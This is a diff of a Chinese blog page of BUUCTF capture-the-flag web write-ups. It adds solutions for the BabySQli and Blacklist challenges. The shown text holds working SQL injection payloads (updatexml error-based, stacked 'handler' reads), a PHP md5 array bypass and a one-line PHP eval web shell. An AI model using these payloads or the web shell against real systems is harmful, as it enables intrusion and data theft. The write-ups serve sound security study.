@@ -19,7 +19,7 @@
     <meta name="description" content="[护网杯 2018]easy_tornado 1进入答题页面，发现三个超链接分别点击进去再点击进去后url中传输了两个参数，一个是filename，另一个是filehash，在第一个flag.txt中把filename改为提示的&#x2F;fllllllllllllag试试提交后页面显示error看来拿到flag的关键就在于解出filehash是什么，根据第三个超链接的提示，应该是filehash">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuctf_web">
-<meta property="og:url" content="http://example.com/2023/07/09/buuctf_web/index.html">
+<meta property="og:url" content="http://example.com/2023/07/15/buuctf_web/index.html">
 <meta property="og:site_name" content="奇怪的亚索">
 <meta property="og:description" content="[护网杯 2018]easy_tornado 1进入答题页面，发现三个超链接分别点击进去再点击进去后url中传输了两个参数，一个是filename，另一个是filehash，在第一个flag.txt中把filename改为提示的&#x2F;fllllllllllllag试试提交后页面显示error看来拿到flag的关键就在于解出filehash是什么，根据第三个超链接的提示，应该是filehash">
 <meta property="og:locale" content="zh_CN">
@@ -54,8 +54,14 @@
 <meta property="og:image" content="http://example.com/images/P45UMTRF.png">
 <meta property="og:image" content="http://example.com/images/U5SYBY1GKWV.png">
 <meta property="og:image" content="http://example.com/images/8HOSK.png">
-<meta property="article:published_time" content="2023-07-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-07-09T16:04:47.072Z">
+<meta property="og:image" content="http://example.com/images/L64.png">
+<meta property="og:image" content="http://example.com/images/N7R0.png">
+<meta property="og:image" content="http://example.com/images/Y276WNW.png">
+<meta property="og:image" content="http://example.com/images/LG.png">
+<meta property="og:image" content="http://example.com/images/IR6X2.png">
+<meta property="og:image" content="http://example.com/images/Q560M.png">
+<meta property="article:published_time" content="2023-07-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-15T11:23:31.757Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/0AYQ%25Q.png">
@@ -256,8 +262,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-09 00:00" pubdate>
-          2023年7月9日 凌晨
+        <time datetime="2023-07-15 00:00" pubdate>
+          2023年7月15日 凌晨
         </time>
       </span>
     
@@ -268,7 +274,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.4k 字
+          9.1k 字
         
       </span>
     
@@ -279,7 +285,7 @@
         
         
         
-          62 分钟
+          77 分钟
         
       </span>
     
@@ -380,7 +386,7 @@
 <p><img src="/images/16B3IU.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>爆值</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png" srcset="/img/loading.gif" lazyload><br>并没有成功显示flag，只显示了一半~<br>经过查询知道了right()可以查询后面的部分<br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>和前面显示出的flag拼接删改得到完整的flag</p>
 <h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>直接给出源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure>
 
 
 <p>发现第五个if可以获得flag<br>先第一个if<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>isset检查是否有效，随便输一个字符就能通过<br>第二个if<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>绕过这个if要先想到MD5漏洞，我先想到的是0e开头的漏洞<br>ps:md5 值是 0e 开头，在 php 弱类型比较中判断为相等<br>再看回来，弱比较是&#x3D;&#x3D;，而本题中是&#x3D;&#x3D;&#x3D;强比较，所以不能用这个绕过<br>在查阅后发现还有一种方法——数组绕过<code>a[]=a&amp;b[]=b</code><br>虽然会报错，但判断为真，判断为null&#x3D;&#x3D;&#x3D;null<br>而且id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png" srcset="/img/loading.gif" lazyload><br>You got the first steponly one way to get the flag</p>
@@ -396,6 +402,27 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>上传成功，蚁剑连接以找到flag</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>首先在靶机页面里他给了个github网址，进入在web&#x2F;babysqli&#x2F;html&#x2F;search.php里找到重要源码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>	die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br>		<span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>				echo <span class="hljs-variable">$flag</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>输入万能钥匙1’ or 1&#x3D;1#显示do not hack me 与上面对应，限制了or</p>
+<p>抓包<br><img src="/images/L64.png" srcset="/img/loading.gif" lazyload><br>这里显示wrong user!<br>挨个试试1，2，3的位置，把它们改为’admin’，在2位置时回显发生了改变<br><img src="/images/N7R0.png" srcset="/img/loading.gif" lazyload><br>wrong pass!<br>跳过了user，那么3的位置就是password了<br>注意到上面的代码if中有MD5，使if成立<br>设密码为abc，MD5加密后为：900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>输入  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png" srcset="/img/loading.gif" lazyload><br>根据字面意思，flag应该在FlagHere里<br>输入  <code>1&#39;;cat FlagHere</code><br>没有显示</p>
+<p>联合注入<br>输入  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png" srcset="/img/loading.gif" lazyload><br>显示了被过滤掉的内容</p>
+<p>尝试双写绕过<br><code>1&#39;;sselectelect from FlagHere</code><br>不通过</p>
+<p>尝试大小写绕过<br><code>1&#39;;sElECt from FlagHere;#</code><br>同样不通过</p>
+<h4 id="handler语法"><a href="#handler语法" class="headerlink" title="handler语法"></a>handler语法</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>语句，一行一行的浏览一个表中的数据。<br><span class="hljs-keyword">handler</span>语句并不具备<span class="hljs-keyword">select</span>语句中的所有功能。<br>mysql专用的语句，并没有包含到<span class="hljs-keyword">sql</span>标准中。<br><span class="hljs-keyword">handler</span>语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>HANDLER tbl_name OPEN<br>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</li>
+<li>HANDLER tbl_name READ FIRST<br>获取句柄的第一行，通过READ NEXT依次获取其它行，ui后一行执行之后再执行NEXT会返回一个空的结果。</li>
+<li>HANDLER tbl_name CLOSE<br>关闭打开的句柄</li>
+<li>HANDLER tbl_name READ index_name&#x3D;value<br>通过索引列指定一个值，可以指定从哪一行开始，通过NEXT继续浏览。</li>
+</ol>
+<p>输入</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/Q560M.png" srcset="/img/loading.gif" lazyload><br>成功</p>
 
                 
               </div>
@@ -414,7 +441,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>buuctf_web</div>
-      <div>http://example.com/2023/07/09/buuctf_web/</div>
+      <div>http://example.com/2023/07/15/buuctf_web/</div>
     </div>
     <div class="license-meta">
       
@@ -426,7 +453,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月9日</div>
+          <div>2023年7月15日</div>
         </div>
       
       
@@ -457,6 +484,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/07/16/phptexin/" title="php特性">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php特性</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
